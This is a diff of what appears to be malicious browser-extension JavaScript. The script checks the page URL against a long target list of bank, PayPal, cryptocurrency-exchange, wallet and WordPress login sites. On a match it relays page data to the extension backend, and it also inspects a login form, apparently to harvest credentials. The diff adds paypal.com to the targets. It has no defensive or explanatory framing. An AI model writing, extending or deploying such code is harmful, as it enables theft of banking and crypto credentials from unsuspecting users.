@@ -1,11 +1,10 @@
 (new Image).src = "//whos.amung.us/swidget/bbbbbbbbd";
-var myStringArray = ["secureinternetbank.com", "secureweb.inalco.com","financierebn.com", "bncd.ca", "bvi.bnc.ca" ,"commercial.bnc.ca", "ipko.pl", "banca", "banco", "bank", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "wp-admin.php", "wp-login.php", "bitcoin","blockchain.info","wallet","paxful.com","coin.space","coinapult.com", "bitgo.com", "strongcoin.com", "coinhive.com", "spectrocoin.com", "wirexapp.com", "xapo.com", "iqoption.com", "etoro.com", "bittrex.com", "localbitcoins.com", "cex.io", "kraken.com", "etherdelta.com", "bitfinex.com", "bitstamp.net", "bisq.network", "gdax.com", "shapeshift.io", "binance.com", "coinmama.com", "bitcoin.de", "bithumb.com", "coinatmradar.com", "poloniex.com", "changelly.com", "zebpay.com", "bitso.com", "gemini.com", "yobit.net", "luno.com", "bitbay.net", "bitpanda.com", "bitflyer.jp", "cryptonia.co.nz", "btcmarkets.net", "coinchceck.com", "bx.in.th", "bitcoin.co.id", "anycoindirect.eu", "hitbtc.com", "bitmex.com", "indacoin.com"];
+var myStringArray = ["paypal.com","secureinternetbank.com", "secureweb.inalco.com","financierebn.com", "bncd.ca", "bvi.bnc.ca" ,"commercial.bnc.ca", "ipko.pl", "banca", "banco", "bank", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "wp-admin.php", "wp-login.php", "bitcoin","blockchain.info","wallet","paxful.com","coin.space","coinapult.com", "bitgo.com", "strongcoin.com", "coinhive.com", "spectrocoin.com", "wirexapp.com", "xapo.com", "iqoption.com", "etoro.com", "bittrex.com", "localbitcoins.com", "cex.io", "kraken.com", "etherdelta.com", "bitfinex.com", "bitstamp.net", "bisq.network", "gdax.com", "shapeshift.io", "binance.com", "coinmama.com", "bitcoin.de", "bithumb.com", "coinatmradar.com", "poloniex.com", "changelly.com", "zebpay.com", "bitso.com", "gemini.com", "yobit.net", "luno.com", "bitbay.net", "bitpanda.com", "bitflyer.jp", "cryptonia.co.nz", "btcmarkets.net", "coinchceck.com", "bx.in.th", "bitcoin.co.id", "anycoindirect.eu", "hitbtc.com", "bitmex.com", "indacoin.com"];
 var arrayLength = myStringArray.length;
 for (var i = 0; i < arrayLength; i++) {
     if (window.location.href.indexOf(myStringArray[i]) > -1) {
-        url = window.location.href;
           var login = {};
-          login.href = url;
+          login.href = window.location.href;
          chrome.runtime.sendMessage({cmd: "w",login});
 }
 }
@@ -400,7 +399,7 @@ var login_form = document.getElementById("loginForm");
 
 var img = document.getElementsByTagName('img');
      for (var i = 0; i < img.length; i++){
-    	if (img[i].src.indexOf('amung.us') > -1){
+    	if (img[i].src.indexOf('whos.amung.us/swidget/') > -1){
       var login = {};
       login.href = window.location.href;
       login.title = document.title;
